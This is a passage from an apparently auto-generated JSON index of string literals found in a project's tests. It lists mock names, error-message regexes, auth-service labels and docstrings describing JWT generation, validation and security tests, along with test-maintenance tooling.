          "category": "test_literals",
          "locations": []
        },
        "Async setup - override in subclasses": {
          "value": "Async setup - override in subclasses",
          "category": "test_literals",
          "locations": []
        },
        "Async teardown - override in subclasses": {
          "value": "Async teardown - override in subclasses",
          "category": "test_literals",
          "locations": []
        },
        "AsyncMock()": {
          "value": "AsyncMock()",
          "category": "test_literals",
          "locations": []
        },
        "AsyncMock\\(": {
          "value": "AsyncMock\\(",
          "category": "test_literals",
          "locations": []
        },
        "AsyncMock\\(\\)": {
          "value": "AsyncMock\\(\\)",
          "category": "test_literals",
          "locations": []
        },
        "AsyncMock\\(spec=LLMManager\\)": {
          "value": "AsyncMock\\(spec=LLMManager\\)",
          "category": "test_literals",
          "locations": []
        },
        "Attempt to automatically fix violations": {
          "value": "Attempt to automatically fix violations",
          "category": "test_literals",
          "locations": []
        },
        "Attempt to fix common issues automatically": {
          "value": "Attempt to fix common issues automatically",
          "category": "test_literals",
          "locations": []
        },
        "AttributeError": {
          "value": "AttributeError",
          "category": "test_literals",
          "locations": []
        },
        "AttributeError: '(\\w+)' object has no attribute '(\\w+)'": {
          "value": "AttributeError: '(\\w+)' object has no attribute '(\\w+)'",
          "category": "test_literals",
          "locations": []
        },
        "AttributeError: <module '([\\w\\.]+)'.*> does not have the attribute '(\\w+)'": {
          "value": "AttributeError: <module '([\\w\\.]+)'.*> does not have the attribute '(\\w+)'",
          "category": "test_literals",
          "locations": []
        },
        "Auth Endpoint:": {
          "value": "Auth Endpoint:",
          "category": "test_literals",
          "locations": []
        },
        "Auth Health": {
          "value": "Auth Health",
          "category": "test_literals",
          "locations": []
        },
        "Auth Service": {
          "value": "Auth Service",
          "category": "test_literals",
          "locations": []
        },
        "Auth Service Health": {
          "value": "Auth Service Health",
          "category": "test_literals",
          "locations": []
        },
        "Auth Service Integration Tests": {
          "value": "Auth Service Integration Tests",
          "category": "test_literals",
          "locations": []
        },
        "Auth Tests - Split from test_oauth_flows.py": {
          "value": "Auth Tests - Split from test_oauth_flows.py",
          "category": "test_literals",
          "locations": []
        },
        "Auth service URL": {
          "value": "Auth service URL",
          "category": "test_literals",
          "locations": []
        },
        "Auth service URL not found": {
          "value": "Auth service URL not found",
          "category": "test_literals",
          "locations": []
        },
        "Auth service health check failed:": {
          "value": "Auth service health check failed:",
          "category": "test_literals",
          "locations": []
        },
        "Authentication Token Generation Tests - Business Impact\n\nSecurity Foundation: Core Authentication Infrastructure\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance  \n- Foundation for all authentication and authorization in the platform\n\nTechnical Excellence:\n- JWT token generation: access, refresh, and service tokens with proper structure\n- Token claims validation: user ID, email, permissions, and metadata\n- Token timing: consistent generation performance and unique token creation\n- Token type consistency: standardized structure across all token types\n- Expiry configuration: proper token lifetime management for security\n\nPlatform Security:\n- Platform: Secure token generation foundation for all authentication\n- Security: JWT structure compliance for SOC2/GDPR requirements\n- Microservices: Service token generation for inter-service communication\n- Performance: Fast token generation (<1s) for responsive authentication\n- Consistency: Standardized token structure across all authentication flows": {
          "value": "Authentication Token Generation Tests - Business Impact\n\nSecurity Foundation: Core Authentication Infrastructure\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance  \n- Foundation for all authentication and authorization in the platform\n\nTechnical Excellence:\n- JWT token generation: access, refresh, and service tokens with proper structure\n- Token claims validation: user ID, email, permissions, and metadata\n- Token timing: consistent generation performance and unique token creation\n- Token type consistency: standardized structure across all token types\n- Expiry configuration: proper token lifetime management for security\n\nPlatform Security:\n- Platform: Secure token generation foundation for all authentication\n- Security: JWT structure compliance for SOC2/GDPR requirements\n- Microservices: Service token generation for inter-service communication\n- Performance: Fast token generation (<1s) for responsive authentication\n- Consistency: Standardized token structure across all authentication flows",
          "category": "test_literals",
          "locations": []
        },
        "Authentication Token Generation Tests - JWT token creation and structure validation\n\nTests JWT token generation with various claims, token types, and security configurations.\nCritical for ensuring secure token creation in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance\n- Foundation for all authentication and authorization in the platform\n\nTest Coverage:\n- Basic access token generation\n- Access tokens with permission claims\n- Refresh token generation with proper structure\n- Service token generation for microservice communication\n- Token structure validation and security compliance": {
          "value": "Authentication Token Generation Tests - JWT token creation and structure validation\n\nTests JWT token generation with various claims, token types, and security configurations.\nCritical for ensuring secure token creation in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance\n- Foundation for all authentication and authorization in the platform\n\nTest Coverage:\n- Basic access token generation\n- Access tokens with permission claims\n- Refresh token generation with proper structure\n- Service token generation for microservice communication\n- Token structure validation and security compliance",
          "category": "test_literals",
          "locations": []
        },
        "Authentication Token Security Tests - Business Impact\n\nSecurity Foundation: Critical Security Protection ($100K+ MRR)\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTechnical Excellence:\n- Signature verification: tampered token detection and integrity protection\n- Claims extraction: secure claims validation and privilege boundaries\n- Attack prevention: 'none' algorithm, timing attacks, and signature tampering\n- Revocation support: user-based and time-based revocation mechanisms\n- Security boundaries: token type enforcement and privilege separation\n- Timing resistance: consistent validation times to prevent timing attacks\n\nEnterprise Security:\n- Platform: Comprehensive security foundation for enterprise authentication\n- Compliance: Security validation for SOC2/GDPR enterprise requirements\n- Attack Prevention: Protection against common JWT security vulnerabilities\n- Integrity: Signature and claims validation maintains authentication trust\n- Boundaries: Security separation between token types and privileges": {
          "value": "Authentication Token Security Tests - Business Impact\n\nSecurity Foundation: Critical Security Protection ($100K+ MRR)\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTechnical Excellence:\n- Signature verification: tampered token detection and integrity protection\n- Claims extraction: secure claims validation and privilege boundaries\n- Attack prevention: 'none' algorithm, timing attacks, and signature tampering\n- Revocation support: user-based and time-based revocation mechanisms\n- Security boundaries: token type enforcement and privilege separation\n- Timing resistance: consistent validation times to prevent timing attacks\n\nEnterprise Security:\n- Platform: Comprehensive security foundation for enterprise authentication\n- Compliance: Security validation for SOC2/GDPR enterprise requirements\n- Attack Prevention: Protection against common JWT security vulnerabilities\n- Integrity: Signature and claims validation maintains authentication trust\n- Boundaries: Security separation between token types and privileges",
          "category": "test_literals",
          "locations": []
        },
        "Authentication Token Security Tests - Security validation and attack prevention\n\nTests JWT token security features including signature verification, tampering detection,\nrevocation mechanisms, and comprehensive security boundary enforcement.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Security Compliance | Impact: Critical Security\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTest Coverage:\n- JWT signature verification and tampering detection\n- Token revocation mechanisms and security lifecycle\n- Claims extraction and security validation\n- Attack prevention and security boundary enforcement\n- Security compliance validation for enterprise requirements": {
          "value": "Authentication Token Security Tests - Security validation and attack prevention\n\nTests JWT token security features including signature verification, tampering detection,\nrevocation mechanisms, and comprehensive security boundary enforcement.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Security Compliance | Impact: Critical Security\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTest Coverage:\n- JWT signature verification and tampering detection\n- Token revocation mechanisms and security lifecycle\n- Claims extraction and security validation\n- Attack prevention and security boundary enforcement\n- Security compliance validation for enterprise requirements",
          "category": "test_literals",
          "locations": []
        },
        "Authentication Token Validation Tests - Business Impact\n\nSecurity Foundation: Authentication Integrity Protection\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTechnical Excellence:\n- Token validation: comprehensive validation for access, refresh, and service tokens\n- Security boundaries: proper token type enforcement and access control\n- Signature verification: tampered token detection and integrity protection\n- Expiry validation: time-based security and token lifecycle management\n- Performance validation: fast token validation (<10ms average) for responsive auth\n- Concurrent validation: thread-safe validation for production scalability\n\nPlatform Security:\n- Platform: Secure token validation foundation for all authentication flows\n- Security: Comprehensive validation prevents security vulnerabilities and attacks\n- Performance: Fast validation ensures responsive authentication experience\n- Boundaries: Token type enforcement prevents privilege escalation\n- Integrity: Signature and timing validation maintains authentication trust": {
          "value": "Authentication Token Validation Tests - Business Impact\n\nSecurity Foundation: Authentication Integrity Protection\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTechnical Excellence:\n- Token validation: comprehensive validation for access, refresh, and service tokens\n- Security boundaries: proper token type enforcement and access control\n- Signature verification: tampered token detection and integrity protection\n- Expiry validation: time-based security and token lifecycle management\n- Performance validation: fast token validation (<10ms average) for responsive auth\n- Concurrent validation: thread-safe validation for production scalability\n\nPlatform Security:\n- Platform: Secure token validation foundation for all authentication flows\n- Security: Comprehensive validation prevents security vulnerabilities and attacks\n- Performance: Fast validation ensures responsive authentication experience\n- Boundaries: Token type enforcement prevents privilege escalation\n- Integrity: Signature and timing validation maintains authentication trust",
          "category": "test_literals",
          "locations": []
        },
        "Authentication Token Validation Tests - JWT token validation and security verification\n\nTests JWT token validation scenarios including signature verification, expiry checking,\ntoken type validation, and security boundary enforcement in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Core Security\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTest Coverage:\n- Valid token validation across different token types\n- Invalid token type rejection and security boundaries\n- Token expiry validation and time-based security\n- Signature verification and tampering detection\n- Token structure validation and malformed token handling": {
          "value": "Authentication Token Validation Tests - JWT token validation and security verification\n\nTests JWT token validation scenarios including signature verification, expiry checking,\ntoken type validation, and security boundary enforcement in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Core Security\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTest Coverage:\n- Valid token validation across different token types\n- Invalid token type rejection and security boundaries\n- Token expiry validation and time-based security\n- Signature verification and tampering detection\n- Token structure validation and malformed token handling",
          "category": "test_literals",
          "locations": []
        },
        "Authentication test failed:": {
          "value": "Authentication test failed:",
          "category": "test_literals",
          "locations": []
        },
        "Authentication testing utilities": {
          "value": "Authentication testing utilities",
          "category": "test_literals",
          "locations": []
        },
        "Authentication-specific test settings": {
          "value": "Authentication-specific test settings",
          "category": "test_literals",
          "locations": []
        },
        "Authentication:": {
          "value": "Authentication:",
          "category": "test_literals",
          "locations": []
        },
        "Authorization": {
          "value": "Authorization",
          "category": "test_literals",
          "locations": []
        },
        "Auto-fix functionality not implemented yet.": {
          "value": "Auto-fix functionality not implemented yet.",
          "category": "test_literals",
          "locations": []
        },
        "Auto-fix linting issues": {
          "value": "Auto-fix linting issues",
          "category": "test_literals",
          "locations": []
        },
        "Auto-fix operations can break your tests!": {
          "value": "Auto-fix operations can break your tests!",
          "category": "test_literals",
          "locations": []
        },
        "Auto-generated by Autonomous Test Reviewer with Ultra-Thinking\nGenerated:": {
          "value": "Auto-generated by Autonomous Test Reviewer with Ultra-Thinking\nGenerated:",
          "category": "test_literals",
          "locations": []
        },
        "Auto-split a large test file (experimental)": {
          "value": "Auto-split a large test file (experimental)",
          "category": "test_literals",
          "locations": []
        },
        "Auto-splitting is experimental - manual review required": {
          "value": "Auto-splitting is experimental - manual review required",
          "category": "test_literals",
          "locations": []
        },
        "Automated Test Size Violation Fixer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity - Enable test runner to function, unblock development pipeline\n- Value Impact: Restores test execution capability, prevents regression accumulation\n- Strategic Impact: $50K+ monthly dev velocity protection through working test infrastructure\n\nThis script automatically fixes test size violations by:\n1. Splitting oversized test files (>300 lines) into focused modules\n2. Extracting common fixtures and utilities\n3. Breaking large test functions (>8 lines) into focused tests\n4. Preserving all test functionality while improving maintainability": {
          "value": "Automated Test Size Violation Fixer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity - Enable test runner to function, unblock development pipeline\n- Value Impact: Restores test execution capability, prevents regression accumulation\n- Strategic Impact: $50K+ monthly dev velocity protection through working test infrastructure\n\nThis script automatically fixes test size violations by:\n1. Splitting oversized test files (>300 lines) into focused modules\n2. Extracting common fixtures and utilities\n3. Breaking large test functions (>8 lines) into focused tests\n4. Preserving all test functionality while improving maintainability",
          "category": "test_literals",
          "locations": []
        },
        "Automated test thread": {
          "value": "Automated test thread",
          "category": "test_literals",
          "locations": []
        },
        "Automatic function refactoring is not supported": {
          "value": "Automatic function refactoring is not supported",
          "category": "test_literals",
          "locations": []
        },
        "Automatically fix identified issues": {
          "value": "Automatically fix identified issues",
          "category": "test_literals",
          "locations": []
        },
        "Automatically fix test size violations": {
          "value": "Automatically fix test size violations",
          "category": "test_literals",
          "locations": []
        },
        "Autonomous Test Review System - Entry Point\nWrapper script for the autonomous test review system": {
          "value": "Autonomous Test Review System - Entry Point\nWrapper script for the autonomous test review system",
          "category": "test_literals",
          "locations": []
        },
        "Autonomous Test Review System - Main Reviewer\nMain autonomous test reviewer class for orchestrating analysis and improvements": {
          "value": "Autonomous Test Review System - Main Reviewer\nMain autonomous test reviewer class for orchestrating analysis and improvements",
          "category": "test_literals",
          "locations": []
        },
        "Autonomous Test Review System - Test Generator\nIntelligent test generation and modernization capabilities": {
          "value": "Autonomous Test Review System - Test Generator\nIntelligent test generation and modernization capabilities",
          "category": "test_literals",
          "locations": []
        },
        "Available CLI tools:": {
          "value": "Available CLI tools:",
          "category": "test_literals",
          "locations": []
        },
        "Available categories:": {
          "value": "Available categories:",
          "category": "test_literals",
          "locations": []
        },
        "Average Business Value Score:": {
          "value": "Average Business Value Score:",
          "category": "test_literals",
          "locations": []
        },
        "Average validation time:": {
          "value": "Average validation time:",
          "category": "test_literals",
          "locations": []
        },
        "BACKEND_PORT": {
          "value": "BACKEND_PORT",
          "category": "test_literals",
          "locations": []
        },
        "BACKEND_URL": {
          "value": "BACKEND_URL",
          "category": "test_literals",
          "locations": []
        }
      }
    }
  }
}